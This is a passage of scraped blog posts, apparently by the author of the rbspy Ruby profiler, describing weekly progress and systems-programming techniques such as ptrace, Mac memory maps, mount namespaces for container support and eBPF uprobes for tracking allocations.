a\nstack trace, it would always Just Work. Instead, I still got a small number of errors! Why?? \n\n I went and took a shower to think about it, and then came up with a way to figure out why! \n\n Since we’re ptracing the process (it’s stopped!), we can get the instruction pointer of the Ruby\nprocess to see what instruction it’s running. \n\n Here’s what that looks like (just 3 lines of code, using the nix and libc crates! Very easy!). We\nuse ptrace and the  PTRACE_GETREGS  request to get the instruction pointer and print it out. \n\n let mut regs = unsafe {std::mem::zeroed::<libc::user_regs_struct>() };\nnix::sys::ptrace::ptrace(ptrace::PTRACE_GETREGS, nix::unistd::Pid::from_raw(pid), 0 as * mut c_void, &mut regs as *mut user_regs_struct as * mut c_void);\nprintln!(\"instruction pointer: {:x}\", regs.rip);\n \n\n Once I had the instruction pointer ( 0x5647fbb7bcbf  for example), I attached to the process with gdb instead and ran \n\n (gdb) x/10x 0x5647fbb7bcbf\n0x5647fbb7bcbf <vm_call_iseq_setup+351>:\t0xd0588949\t0x00e48e0f\t0x29480000\t0xf10148d1\n0x5647fbb7bccf <vm_call_iseq_setup+367>:\t0x3ce1c148\t0x3fe9c148\t0x41f93944\t0x41cf470f\n \n\n That’s interesting! I know that an  iseq  is a thing I need to , so it makes sense that if it’s\nrunning some sort of “iseq setup” then maybe the stack in memory is not in a totally valid state\nyet? \n\n I ran the experiment a couple more times and got similar answers: \n\n (gdb) x/10x 0x5636be0c4cb3\n0x5636be0c4cb3 <vm_call_iseq_setup+339>:\t0xe870894d\t0xf840c749\t0x00000000\t0xd0588949\n0x5636be0c4cc3 <vm_call_iseq_setup+355>:\t0x00e48e0f\t0x29480000\t0xf10148d1\t0x3ce1c148\n0x5636be0c4cd3 <vm_call_iseq_setup+371>:\t0x3fe9c148\t0x41f93944\n \n\n (gdb) x/5x 0x5622c3d02417\n0x5622c3d02417 <vm_call_iseq_setup_normal_0start_0params_0locals+87>:\t0xe042894c\t0xe852894c\t0xf842c748\t0x00000000\n \n\n So that’s in  vm_call_iseq_setup_normal_0start_0params_0locals  and  vm_call_iseq_setup . This is\nstill confusing to me – I’ve spent half an hour trying to read the Ruby interpreter code to see why\nthe stack during these code paths might be invalid, but haven’t figured it out yet – I understand\nhow in  vm_push_frame  the stack could be invalid at some points (because it’s putting a new stack frame onto the\nstack), but neither of these addresses are in  vm_push_frame . \n\n It does definitely seem like there are points during execution of the Ruby interpreter when the\nstack is not valid though. That’s fine! I can just drop a few stack traces, say “whoops, those\ndidn’t work”, and move on. That is the joy of having a sampling profiler. \n\n that’s all for now \n\n Will keep trying to figure this out and I’ll post more if I figure out more! Also if you understand\nthis better and want to tell me about it I’d be happy to hear from you! \n\n"},
{"url": "https://jvns.ca/blog/2018/01/15/profiler-week-2--support-for-1-9-3----2-5-0--and-line-numbers/", "title": "Profiler week 2: support for 1.9.3 -> 2.5.0, and line numbers!", "content": "\n     \n\n Hello! Week 2 of profiler writing is over! In week 2, I: \n\n \n added support for Ruby 1.9.x and 2.5.0!! This means I can support every ruby version from 1.9.1 to\n2.5.0 which I think is basically every Ruby version anyone will reasonably use!! \n added support for getting the line number that the interpreter is currently running (so useful!) \n did a lot of refactoring to improve error handling & reporting. (for example I now have a\n ProcessEndedError  to check if I failed to get a stack trace because the process). I started\nusing the  failure  crate which is great so far. \n added “support” for calling into C extensions (by which I mean: the profiler doesn’t crash, it\njust ignores all calls into C extensions) \n refactored my bindgen-generated ruby bindings out into a separate crate (which) \n did  some investigations into whether I should pause the Ruby process I’m profiling with ptrace \n \n\n The most exciting update from last week is – I profiled Rubocop, and it worked!!!!! Rubocop is a\npopular linter/static analysis tool for Ruby. I mostly just picked it because it’s a standalone\nprogram and it makes a lot of function calls. It was really fun & motivating to see it working! \n\n Here are two graphs I generated by profiling Rubocop! (I generated these basically by running\n ./path/to/profiler --file stacks.txt rubocop  and then using brendan gregg’s flamegraph tool on the\noutput stacks.txt) \n\n First, here’s what Rubocop looks like when linting when it has a  cache . (did you know Rubocop\nhas a cache? I didn’t!). If you click to zoom in you’ll see that it spends 40% of its time doing\nfile checksums which is not that surprising! \n\n \n \n \n \n \n\n Here’s what Rubocop looks like when it  doesn’t  have a cache. Much more complicated! If you look\nat the function calls, you’ll actually see that the call stacks are kind of weird – they look like\n on_while -> on_module -> on_while -> on_begin -> on_begin -> on_def -> on_begin... . I think what’s\ngoing on here is that Rubocop is going through the AST of the program it’s linting and calling a new\nfunction for each part of the AST. So the call stack of Rubocop basically reflects the structure of\nthe program it’s linting, which is kind of interesting. \n\n \n \n \n \n \n\n this week’s goal: first experimental release! \n\n Since it’s working so well (there are lots of problems but it’s producing useful output!!), this\nweek my goal is to release a first experimental release. \n\n The week’s release should feature: \n\n \n support for seeing which line number your code is spending most of its time on. \n support for generating flame graphs  (maybe?) \n lots of bugs that I don’t know about yet =) \n relatively readable code \n a license & contributing guidelines \n a name for the profiler!!! \n \n\n Back to work! \n\n"},
{"url": "https://jvns.ca/blog/2018/01/22/profiler-week-3--refactoring--better-testing--and-an-alpha-release/", "title": "Profiler week 3: refactoring, better testing, and an alpha release!", "content": "\n     \n\n Hello! Week 3 of profiler-building is over! My main goal for last week was to release an alpha, and\nI did! You can download the project & try it out at  https://github.com/rbspy/rbspy . \n\n If you’re interested in how the project is organized, I wrote an  architecture document  this week. \n\n If you do find it useful, I’d be really interested to hear about what you’re using it for – you can\nemail me,  leave a message on gitter , tweet at me – anything! Also\nI very much appreciate bug reports :) \n\n For example, somebody  said on Twitter  that they used  rbspy snapshot  (which prints a single stack trace from the\nprogram) to figure out why their tests were running slowly! This made me super happy =). \n\n \n I used it to profile a test run on CI: some tests suddenly became very slow; I connected to the\ncontainer thru SSH, downloaded rbspy and took a couple of snapshots while tests were running; that\nwas enough to find the cause of the problem) \n \n\n name: rbspy! \n\n On Tuesday I polled people on Twitter for name ideas. I wanted something that was a little bit fun\n(profiling is fun!), but not  too  clever – I want people to be able to actually tell what the\nproject does from the name. Hopefully  rbspy  will be that! \n\n Also I drew a quick logo! It is not super fancy but I like it anyway. An alpha logo for an alpha\nrelease :) \n\n \n\n refactoring! \n\n Last week I also refactored the project significantly. I probably spent 2-3 whole days on\ntrying to organize the project better – at the beginning of the week it was all basically one\n1000-line file, and at the end of the week, I had files for \n\n \n initialization code (what happens every time you start the profiler) \n operating-system-specific code (want to add support for a new OS? it goes in  address_finder.rs !) \n ruby-version-specific code (want to add Ruby 2.5.1 support? That goes here in  ruby_version.rs ) \n UI code (all in  main.rs , right now) \n \n\n My most useful strategy for refactoring was to write an  architecture document (which you can read!) . Basically I tried to explain to\nan outsider how the project was put together, found parts that really didn’t make sense, and then\nrefactored until those parts were easier to explain. \n\n I don’t think it’s “perfect” (what is?) but the organization was easier for me to work with at the\nend of the week, and Kamal said it made more sense to him too. \n\n better testing with core dumps! \n\n This week we also got some significantly better testing implemented – now there are a bunch of core\ndumps in the rbspy-testdata repo ( https://github.com/rbspy/rbspy-testdata/tree/master/data ). \n\n During the tests, we \n\n \n load the core dumps \n try to read a stack trace from those core dumps as if it was a real Ruby process \n compare the stack trace we read to the expected output \n \n\n Kamal  wrote the code to make a core dump mimic a real process \nand it’s really simple and clever. This whole testing strategy is Kamal’s idea and he actually\nimplemented the key ideas 1.5 years ago. Also it was his idea to keep the core dumps in a separate\n rbspy-testdata  repository so that we can keep several megabytes of coredumps for testing without\nmaking the main repo huge. \n\n I’m very happy to have these tests and they make me feel a lot more confident that the project is\nactually doing the right thing. And they let me make improvements! For example – right now I have a\ncore dump of a process where rbspy gives me an error if I try to get a stack trace out of it. Once I\nfix the issue (to do with calling C functions), I can check that core dump into  rbspy-testdata ,\nadd a test, and make sure it stays fixed! \n\n One more example of a thing these tests helped me do – I needed to get both the relative and the\nabsolute path to a file in Ruby 1.9.3. Figuring out how to do this was pretty simple (I did a little  git blame  and then this  commit showed me the way ).\nWith the Ruby 1.9.3 core dump, I could add code to get the relative & absolute path, run\n get_stack_trace  on the core dump, and assert that I got the expected answer! Really easy! \n\n contributors! \n\n I published my first release last night. So far 3 people have created issues and I’ve merged a pull\nrequest from one of those people! This is exciting because one of my major goals is to get more\npeople contributing to rbspy so it’s a sustainable project and not just me. \n\n this week: Mac support & container support \n\n This week I’m hoping to add Mac support! I don’t own a Mac, but my plan is to rent a cloud VM for a\nweek or so and develop on that. \n\n I also have a bug to do with C function-calling support that I’m hoping to fix. Also container\nsupport: right now if you try to profile a process running in a container from outside the\ncontainer it won’t work because because the process is in a different filesystem namespace. That\nshouldn’t be too hard to fix. \n\n At some point I also want to start investigating memory profilers – maybe I can add a memory\nprofiler to rbspy? I have no idea what’s involved in that yet! We’ll see! \n\n"},
{"url": "https://jvns.ca/blog/2018/01/26/mac-memory-maps/", "title": "How do you read the memory maps of a Mac process?", "content": "\n     \n\n Hello! For the last few days I’ve been trying to figure out how to get the memory maps of a Mac\nprogram! \n\n why do I need memory maps? \n\n To do profiling, I need the address of 2 variables:  ruby_version  (so I know how the structs will\nbe laid out) and  ruby_current_thread  so I can get stack traces. \n\n Getting the addresses of those 2 variables is not thaat hard – often they’re in the symbol table of\nthe Ruby binary I’m looking at. But because of ASLR (“address space layout randomization”), the\nbinary is loaded into memory at a random place. So I need to: \n\n \n find the address of  ruby_version  in the symbol table \n find out where the Ruby binary is loaded in memory (from the process’s memory maps!) \n add them together! (also subtract the value of the  __mh_execute_header  symbol) \n \n\n On Linux, you get memory maps by looking at the  /proc/PID/maps  file, and they look like this –\nyou have an address range, permissions (eg  r-xp ), a size, an inode number, and possibly a filename\nof the file that’s mapped there. \n\n 00400000-00401000 r-xp 00000000 00:14 13644        /usr/bin/ruby1.9.1\n00600000-00601000 r--p 00000000 00:14 13644        /usr/bin/ruby1.9.1\n00601000-00602000 rw-p 00001000 00:14 13644        /usr/bin/ruby1.9.1\n0060b000-00887000 rw-p 00000000 00:00 0              [heap]\n7f1d44648000-7f1d4464a000 r-xp 00000000 00:14 14411  /usr/lib/ruby/1.9.1/x86_64-linux/enc/trans/transdb.so\n7f1d4464a000-7f1d4484a000 ---p 00002000 00:14 14411  /usr/lib/ruby/1.9.1/x86_64-linux/enc/trans/transdb.so\n7f1d4484a000-7f1d4484b000 r--p 00002000 00:14 14411  /usr/lib/ruby/1.9.1/x86_64-linux/enc/trans/transdb.so\n7f1d4484b000-7f1d4484c000 rw-p 00003000 00:14 14411  /usr/lib/ruby/1.9.1/x86_64-linux/enc/trans/transdb.so\n \n\n On Mac the memory maps have basically the same structure, but getting them is quite a bit harder!\nTrying to do this on Mac gave me a lot of appreciation for Linux’s “everything is a text file in\n/proc” philosophy – it feels a little janky sometimes to be parsing a text file, but getting the\nmemory maps on Linux took me like 2 hours and I was done, and trying to figure it out on Mac has\ntaken me like 3 days and I’m still not finished. \n\n attempt 1: vmmap \n\n My first attempt at this was to use a binary called  vmmap  ( man page ) which will print a process’s memory\nmaps!  vmmap --wide PID  got me all the memory maps I wanted. Neat! \n\n However – vmmap is  super slow  for some reason. It takes 2 seconds to get the memory maps fora\nprocess! I read somewhere (though I can’t find the reference now) that this is because vmmap pauses\nthe process before taking its memory maps. \n\n I can’t find the source to verify  why  vmmap is so slow (if you know where the source for the vmmap\nbinary is, let me know!! It’s not on  https://opensource.apple.com/  as far as I can tell) . \n\n I’m not happy with vmmap being slow for 2 reasons: \n\n \n a 2-second delay is annoying for the user \n (more importantly) if vmmap really is pausing the process, that’s not good – I’d really prefer\nthat my profiling tool not interfere with the process it’s profiling at all. \n \n\n So I don’t want to use vmmap. \n\n attempt 2: reimplement vmmap myself in Rust \n\n Okay, so I don’t want to use the  vmmap  tool. Next step: Reimplement its functionality (or at least\nthe part I need) in Rust! \n\n With the help of  this C example code of a vmmap clone , I wrote a partial sketchy vmmap clone in\nRust! The code is here:  main.rs . \n\n To do this I used the  mach crate , which has Rust bindings for a bunch of Mac\nkernel functions you can call. I also learned that on Macs / BSD there’s this concept of a “port”: \n\n \n a “port” is a protected message queue for communication between tasks; tasks own send rights and\nreceive rights to each port \n \n\n Here’s how I get a single memory map from a program! The interface to this function is a little\nweird – you give it a port ID and an address, and it gives you the first memory map  after  that\naddress. Basically this function just wraps the  mach_vm_region  function from the Mach microkernel.\n(the headers for all the Mach functions are in  /usr/include/mach/*.h ) \n\n I’ve commented the code a bit. It uses the  https://github.com/andrewdavidmackenzie/libproc-rs  crate\nfor the  regionfilename  function (which gives you the filename of the library associated with the\nmemory map). I had to use the version of that crate on github master because the released\nversion had a use-after-free bug. \n\n fn mach_vm_region(target_task: mach_port_name_t, mut address: mach_vm_address_t) -> Option<Region> {\n    let mut count = mem::size_of::<vm_region_basic_info_data_64_t>() as mach_msg_type_number_t;\n    let mut object_name: mach_port_t = 0;\n    // we need to create new `size` and `info` structs for the function we call to read the data\n    // into\n    let mut size = unsafe { mem::zeroed::<mach_vm_size_t>() };\n    let mut info = unsafe { mem::zeroed::<vm_region_basic_info_data_t>() };\n    let result = unsafe {\n        // Call the underlying Mach function\n        mach::vm::mach_vm_region(\n            target_task as vm_task_entry_t,\n            &mut address,\n            &mut size,\n            VM_REGION_BASIC_INFO,\n            &mut info as *mut vm_region_basic_info_data_t as vm_region_info_t,\n            &mut count,\n            &mut object_name,\n        )\n    };\n    if result != KERN_SUCCESS {\n        return None;\n    }\n    // this uses \n    let filename = match regionfilename(41000, address) {\n        Ok(x) => Some(x),\n        _ => None,\n    };\n    Some(Region {\n        size: size,\n        info: info,\n        address: address,\n        count: count,\n        filename: filename,\n    })\n}\n \n\n It made me happy that I could write a reasonable first approximation of a vmmap clone in 100ish\nlines of Rust! \n\n my Rust program: way faster than vmmap! \n\n My Rust program did what I hoped – it runs in like 80ms or something, about 15x faster than vmmap.\nI still don’t know exactly what vmmap is  doing  that’s slow (dtruss didn’t tell me anything\nterribly helpful), but whatever it is, my Rust program isn’t doing that thing. \n\n There’s still a major issue with my Rust vmmap clone – it actually only gives me some of the\nmemory maps from my process right now. For any dynamically linked libraries (including a Ruby\nlibrary, which I need the address and filename of!!) they’re stored in a place called the “dyld\nshared cache” or something which I still haven’t understood and don’t know how to read from yet. \n\n There’s a bunch of code about this “dyld” thing in the links below that I’m planning to read – I\nthink I should be able to get it to work! \n\n Useful resources for reading memory maps from a Mac process \n\n Here are the 4 most useful resources I’ve found so far about reading memory maps on Mac: \n\n \n this vmmap.c source  from an OS\nX internals book \n “Playing with Mach-O binaries and dyld”, on finding the address of shared libraries in a Mac process \n dynamic_images.cc, from Chromium, that reads information shared libraries in a Mac process . The  ReadImageInfo  function here is relevant to me I think. \n the OS X C code for psutil . psutil is a really\ncool cross-platform Python library for reading information about processes! It’s what’s used to\nimplement  osquery . So its source is helpful for learning about Mac internals. \n \n\n that’s all for now! \n\n Figuring out how to support Macs in rbspy over the last few days has been interesting! I’ve never\ndone any Mac or BSD systems programming before, and I’m still trying to understand basic concepts\nlike “what is a port?” but I feel like I’m making good progress :D \n\n"},
{"url": "https://jvns.ca/blog/2018/01/26/spy-container/", "title": "How do you spy on a program running in a container?", "content": "\n     \n\n Yesterday I added Linux container support to rbspy, so that an instance of\nrbspy running on the host machine can profile Ruby programs running in\ncontainers. \n\n This was a pretty simple thing (~50 lines of code,\n https://github.com/rbspy/rbspy/pull/68  ), but I thought it would be fun to\nexplain what adding “container support” involves in practice! \n\n why didn’t rbspy work with containers before? \n\n First – programs running in containers are just programs, like any other program! You can see them\nby running  ps . So all of the normal things rbspy does (like reading memory from a process) work\njust fine with programs running in containers. There was just one small gotcha. \n\n There’s a small part at the beginning of the program where it reads 1 or 2 binaries from the\nprogram’s memory maps (the Ruby binary, and sometimes another dynamically linked library). \n\n To make this concrete – right now I have a container on my computer running a Ruby program. Its pid\n(in the host PID namespace) is 17474. Looking at its memory maps (with  sudo cat /proc/17474/maps )\nshows me that the Ruby binary it’s running is  /usr/bin/ruby1.9.1  and it has a ruby library loaded\ncalled  /usr/lib/libruby-1.9.1.so.1.9.1 . \n\n 00400000-00401000 r-xp 00000000 00:14 13644                              /usr/bin/ruby1.9.1\n00600000-00601000 r--p 00000000 00:14 13644                              /usr/bin/ruby1.9.1\n00601000-00602000 rw-p 00001000 00:14 13644                              /usr/bin/ruby1.9.1\n7f1d45981000-7f1d45b77000 r-xp 00000000 00:14 13648                      /usr/lib/libruby-1.9.1.so.1.9.1\n7f1d45b77000-7f1d45d76000 ---p 001f6000 00:14 13648                      /usr/lib/libruby-1.9.1.so.1.9.1\n7f1d45d76000-7f1d45d7b000 r--p 001f5000 00:14 13648                      /usr/lib/libruby-1.9.1.so.1.9.1\n7f1d45d7b000-7f1d45d7f000 rw-p 001fa000 00:14 13648                      /usr/lib/libruby-1.9.1.so.1.9.1\n \n\n I need the addresses both those binaries are mapped to in the process’s memory (easy! just look at\n /proc/17474/maps , done) as well as their contents. \n\n Getting their contents is where we run into a problem.  /usr/bin/ruby1.9.1  is not a file on my\nhost’s filesystem. I’m running Ubuntu 16.04, the container is running Ubuntu 14.04, they have\ndifferent system Ruby versions. \n\n The precise issue here is that the target process (in the container) has a  different mount\nnamespace   than rbspy. \n\n how to fix it: switch mount namespaces! \n\n So to make rbspy work with containerized processes, we just need to switch to the target process’s\nmount namespace before reading  /usr/bin/ruby1.9.1  and  /usr/lib/libruby-1.9.1.so.1.9.1 . Then after\nreading those two files, switch back to the previous mount namespace right away so that we can write\noutput to the filesystem in the right place. \n\n That’s pretty simple! Here’s some pseudocode: \n\n setns(target process's namespace, \"mount\")\nread(/usr/bin/ruby1.9.1)\nread(/usr/lib/libruby-1.9.1.so.1.9.1)\nsetns(, \"mount\")\n \n\n what the actual code looks like \n\n Switching mount namespaces is not that hard. To switch mount namespaces I just\nneeded to: \n\n \n Open the file  /proc/$PID/ns/mnt . Get the file descriptor of that file. \n Call  libc::setns(fd, libc::CLONE_NEWNS) . For some reason  CLONE_NEWNS  means “the mount namespace”. \n \n\n really easy! 3 more things to note / be careful of: \n\n \n remember to open  /proc/self/ns/mnt   before  switching mount namespaces, so I can have a file descriptor to use to switch back to the old mount namespace \n make sure I always switch back to the old mount namespace even if there’s an error when reading the files. I did this with  defer! . (which is like Go’s  defer  keyword, the one I used comes a Rust crate called  scopeguard ) \n the ID of a process’s mount namespace is the inode number of  /proc/pid/ns/mnt . I can use that inode number to figure out whether two processes are in the same mount namespace or not \n \n\n Here’s a code snippet: \n\n let other_proc_mnt = &format!(\"/proc/{}/ns/mnt\", pid);\nlet self_proc_mnt = \"/proc/self/ns/mnt\";\n// We need to get `/proc/$PID/maps` before switching namespaces\nlet all_maps = proc_maps(pid)?;\n// read the inode number to check if the two mount namespaces are the same\nif fs::metadata(other_proc_mnt)?.st_ino() == fs::metadata(self_proc_mnt)?.st_ino() {\n    get_program_info_inner(pid, all_maps)\n} else {\n    // switch mount namespace and then switch back after getting the program info\n    // We need to save the fd of the current mount namespace so we can switch back\n    let new_ns = fs::File::open(other_proc_mnt)?;\n    let old_ns = fs::File::open(self_proc_mnt)?;\n    switch_ns(&new_ns)?;\n    // if there's an error at any point, always switch back to the old namespace\n    defer!({switch_ns(&old_ns);});\n    let proginfo = get_program_info_inner(pid, all_maps);\n    proginfo\n \n\n you can’t switch mount namespaces if you’re multithreaded \n\n Originally I wanted to create a separate thread to do the namespace-switching\njuggle. This isn’t possible though: the  setns man page  set me straight. \n\n \n A process may not be reassociated with a new mount namespace if it is multithreaded. \n \n\n The description of setns at the start of the man page says “setns - reassociate\nthread with a namespace”. So I think you  can  change other kinds of\nnamespaces if you’re multithreaded (like I guess you can change the network\nnamespace of a single thread?). You just can’t change the mount namespace. Good\nto know! \n\n and actually you don’t even need to switch mount namespaces! \n\n After I posted this post, someone  very helpfully pointed out on Twitter  that to read the file\n /usr/bin/ruby1.9.1  from a process’s mount namespace you can just read\n /proc/PID/root/usr/bin/ruby1.9.1 . That’s way easier than switching mount namespaces! \n\n Here’s what  the /proc man page  says about\n /proc/PID/root : \n\n \n Note however that this file is not merely a symbolic link.  It provides the same view of the\nfilesystem (including namespaces and the set of per-process mounts) as the process itself. \n \n\n that’s it! \n\n I thought this was a nice example of how understanding the fundamentals of how\ncontainers work (They use different Linux namespaces from your host processes,\nand in this case this mount namespace is the relevant namespace, we don’t care\nabout the rest of the namespaces) helped us add container support really easily. \n\n We didn’t need to care about Docker or anything like that – it’s irrelevant\nwhat container runtime our containers are using, and we certainly don’t\ninteract with Docker at all. We just need to make a few simple system calls and\nit works! \n\n  have questions/thoughts about this?  here’s a twitter thread! \n\n"},
{"url": "https://jvns.ca/blog/2018/01/31/spying-on-a-ruby-process-s-memory-allocations/", "title": "Spying on a Ruby process's memory allocations with eBPF", "content": "\n     \n\n Today instead of working on CPU profilers, I took the day to experiment with a totally new idea! \n\n My idea at the beginning of the day was – what if you could take an arbitrary Ruby process’s PID\n(that was already running!) and start tracking its memory allocations? \n\n Spoiler: I got something working! Here’s an  asciinema demo  of what happened.  Basically this shows a\nlive-updating cumulative view of rubocop’s memory allocations over 15 seconds, counted by class. You can see\nthat Rubocop allocated a few thousand  Array s and  String s and  Range s, some  Enumerator s, etc. \n\n This demo works without making any code changes to  rubocop  at all – I just ran  bundle exec\nrubocop  to start it. All the code for this is in  https://github.com/jvns/ruby-mem-watcher-demo \n(though it’s extremely experimental and likely only works on my machine right now). \n\n \n\n how it works part 1: eBPF + uprobes \n\n The way this works fundamentally is relatively simple. On Linux ~4.4+, you have this feature called\n“uprobes” which let you attach code that you write to an arbitrary userspace function. You can do\nthis from outside the process – you ask the kernel to modify the function while the program is\nrunning and run your code every time the function gets called. \n\n You can’t ask the kernel to run just  any  code, though (at least not with eBPF) – you ask it to\nrun “eBPF bytecode” which is basically C code where you’re restricted in what memory you can access.\nAnd it can’t have loops. \n\n So the idea is that I’d run a tiny bit of code every time a new Ruby object was created in\n rubocop , and then that code would count memory allocations per class. \n\n This is the function I wanted to instrument (add a uprobe to):  newobj_slowpath . \n\n static inline VALUE\nnewobj_slowpath(VALUE klass, VALUE flags, VALUE v1, VALUE v2, VALUE v3, rb_objspace_t *objspace, int wb_protected)\n \n\n The goal was to\ngrab the first argument to that function ( klass ) and count how many allocations there were for\neach  klass . \n\n writing my first bcc program \n\n bcc (the “BPF compiler collection”) at  https://github.com/iovisor/bcc  is a toolkit to help you \n\n \n write BPF programs in C \n compile those BPF programs into BPF bytecode \n insert the compiled BPF bytecode into the kernel \n Write  Python  programs to communicate with the BPF bytecode that’s running in the kernel and\ndisplay the information from that bytecode in a useful way \n \n\n It’s a lot to digest. Luckily the\n documentation  is pretty good\nand there are a LOT of example programs to copy from in the repo. \n\n Here’s the initial BPF program I wrote in a gist . It’s pretty short (just 40 lines!) and has a C part and a Python part. \n\n I’ll explain it a bit because I think it’s not that obvious what it does and it’s really\ninteresting! \n\n First, here’s the C part – the idea is that this code will run every time  newobj_slowpath  runs.\nThis code: \n\n \n declares a BPF hash (which is basically a data structure I can use to store data and send data\nback to userspace where the Python frontend can read it) \n defines a  count  function which reads the first argument of the function (with  PT_REGS_PARM1 )\nand basically does  counts[klass] += 1 \n \n\n BPF_HASH(counts, size_t);\nint count(struct pt_regs *ctx) {\n    u64 zero = 0, *val;\n    size_t klass = PT_REGS_PARM1(ctx);\n    val = counts.lookup_or_init(&klass, &zero);\n    (*val)++;\n    return 0;\n};\n \n\n Next, here’s the Python part. This is just a while loop that every second reads  counts  (the same BPF hash\nbefore, but magically accessible from Python somehow!!), prints out what’s in there, and then clears\nit.. \n\n counts = b.get_table(\"counts\")\n\nwhile True:\n    sleep(1)\n    os.system('clear')\n    print(\"%20s | %s\" % (\"CLASS POINTER\", \"COUNT\"))\n    print(\"%20s | %s\" % (\"\", \"\"))\n    top = list(reversed(sorted([(counts.get(key).value, key.value) for key in counts.keys()])))\n    top = top[:10]\n    for (count, ptr) in top:\n        print(\"%20s | %s\" % (ptr, count))\n    counts.clear()\n \n\n Here’s the outcome of this 42-line program: a cool live updating view showing us how many of each\nclass was allocated! So awesome. \n\n \n\n how do you get the  name  of a class though? \n\n So far this was relatively easy. Having the address of a class is not that useful though – it\ndoesn’t mean anything to me that there were 49 instances of  94477659822920  allocated. \n\n So I wanted to get the name of each class! Very helpfully, there’s a  rb_class2name  function in Ruby that does this – it takes a class pointer and returns a  char *  (string) with the name. \n\n But I wasn’t inside the Ruby process, so I couldn’t exactly call the function. OR COULD I?! Calling\nthe function  did  seem way easier than trying to reverse engineer all the Ruby internals :) \n\n Our goals: \n\n \n call the  rb_class2name  function \n don’t disturb the process we’re profiling at all (certainly don’t call any functions in it!) \n \n\n I ended up writing a separate Rust program to map pointers into class names. \n\n mapping the ruby process’s memory into my memory \n\n My (terrible/delightful) plan for calling  rb_class2name  was basically – copy all the memory maps\nfrom the target process into my profiler process, and then just call  rb_class2name  and hope it\nworks. \n\n Then any memory my target process has, I have too!! And so I can just call functions from that\nprocess as if they were functions in my process. \n\n Here is the relevant code snippet for copying the memory maps. The  copy_map function is defined here \n\n Basically I could copy all the memory maps except the ones called “syscall” and “vvar” which I\ncouldn’t copy. Not sure what those are but I don’t think I needed them. \n\n for map in maps {\n    if map.flags == \"rw-p\" {\n        copy_map(&map, &source, PROT_READ | PROT_WRITE).unwrap();\n    }\n    if map.flags == \"r--p\" {\n        copy_map(&map, &source, PROT_READ | PROT_WRITE).unwrap();\n    }\n    if map.flags == \"r-xp\" {\n        copy_map(&map, &source, PROT_READ | PROT_WRITE | PROT_EXEC).unwrap();\n    }\n}\n \n\n calling  rb_class2name \n\n Calling rb_class2name is pretty easy – I just needed to find the address of  rb_class2name  (which\nI already know how to do from  rbspy ), cast that address to the right kind of function pointer\n( extern \"C\" fn (u64) -> u64 ), and then call the resulting function! \n\n Of course all of this (copying the memory maps, casting essentially a random address into a function\npointer, calling the resulting function) is unsafe in Rust, but I can still do it! \n\n When I finally got this to work at like 9pm today I was so delighted. \n\n segfaults \n\n I kept running into segfaults when trying to translate class pointers into names. Instead of\ndebugging this (I just wanted to get a demo to work!!) I decided to just figure out how to ignore\nthe segfaults because it wasn’t  always  segfaulting, just sometimes. \n\n here is what I did (this is silly, but it was fun) \n\n \n before doing the thing that causes the segfault, fork \n in the child process, try to do the potentially segfaulting thing and print out the answer \n if the child process segfaults, ignore it and keep going \n \n\n this worked great. \n\n how the Rust program and the Python program work together \n\n the way the final demo works is: \n\n \n the Python program is in charge of getting class pointers  + counting how many times each of them\nhas been allocated (with uprobes + BPF) \n the Rust program is in charge of mapping class pointers to class names – you call it with a PID and a\nlist of class pointers as command arguments, and it prints out the mappings to stdout \n \n\n This is of course all a hacky mess but it worked and I got it to work in 1 day which made me super\nhappy! I think it should be possible to do this all in Rust – as long as I can compile and save\nthe appropriate BPF program, I should be able to call the right system calls from Rust to insert\nthat compiled BPF program into the kernel without using bcc. I think. \n\n design principle: magic \n\n The main design principle I’m using right now is – how can I build tools that just feel really\nmagical? (they should also hopefully be useful, of course :)). But I think that eBPF enables a lot\nof really awesome things and I want to figure out how to show that to people! \n\n I feel like this idea of streaming you live updates about what memory your Ruby process is\nallocating (without having to make any changes in your Ruby program beforehand) feels really magical\nand cool. There’s still a lot of work to do to make it useful and it’s not clear how stable I can\nmake it, but I am delighted by this demo! \n\n  questions/comments?  here’s the twitter thread for this post!   \n\n"},
{"url": "https://jvns.ca/blog/2018/01/29/profiler-week-4/", "title": "Profiler week 4: callgrind support, containers, Mac progress!", "content": "\n     \n\n Today is Monday and week 4 of working on my profiler is over! I’m  1 ⁄ 3  of the way through. Eep! My\nmain goal for last week was to release Mac support, which hasn’t quite happened yet – it turns out\nthat Mac systems programming is more complicated than I thought (getting a mac’s memory maps is  really hard!  and I got derailed a bit by  a kernel bug ). \n\n last week (contributions!!) \n\n exciting things that happened last week: \n\n \n 2 new people contributed code to rbspy! ( @liaden  and  @vasi !). liaden contributed a  --duration  flag\nand a  --rate  flag, so you can change the rate rbspy is sampling at. vasi contributed a new\noutput format for rbspy (cachegrind format!) which I think will be useful – it lets you see.\n The cachegrind PR has some nice pictures . \n also lots of folks made issues and suggestions and tried it out, which is awesome. All the issues\nare so helpful! \n Added support for profiling processes running in containers! It seems to work well! \n Learned A LOT more about Mac systems programming than I used to know. I think I should be able to\nmerge a Mac support PR in the next day or two. \n \n\n So far it seems like Rust is easy enough that some non-Rust-programmers can come in and start\ncontributing PRs to rbspy, which is really nice to see! \n\n next week \n\n On the schedule for this week: \n\n \n finish up Mac support \n fix a bug with getting the stacks when the top function in the stack is a C function that I can\nreproduce \n possibly put together a website? \n @liaden is working on support for profiling subprocesses (so you can point rbspy at your Unicorn\nprocess or something, and it’ll profile all of your web workers). I think that’ll be awesome. \n \n\n a Rust flamegraph library? \n\n Something that’s been on my mind but I haven’t really figured out is – rbspy is growing a few new\nvisualization formats (flamegraphs! callgrind format!). I think it could be cool to build a Rust\ncrate with support for different visualization formats, so that if people build other profilers then\nthey can kinda have access to a consistent library of visualization formats. \n\n I don’t really know if I have time for that though! For now I’m going to stay focused on lower level\nconcerns. \n\n MEMORY PROFILERS!!! \n\n I’m not done with CPU profiling (there are still lots of rough edges to sort out!) but once I get\nthings slightly more feature complete I think I kinda want to let the CPU profiler rest for a bit and work on\nprototyping something else while I give people a chance to try out the project. \n\n Today I had 2 extremely helpful conversations about memory profilers and I feel excited about trying\nsomething out! \n\n My thought is to maybe add a  memprofile  subcommand to rbspy, where you give it a PID and it\ndoes… something? I have 2 ideas for what it could do right now: \n\n \n give you a memory profile of your program (a summary of objects / their types / their sizes) \n start tracking  new  allocations and tell you where they’re happening and how much memory is\nbeing allocated right now. \n \n\n I’m hoping to have time to do some work prototyping a memory profiler this week. We’ll see what\nhappens in real life! \n\n"},
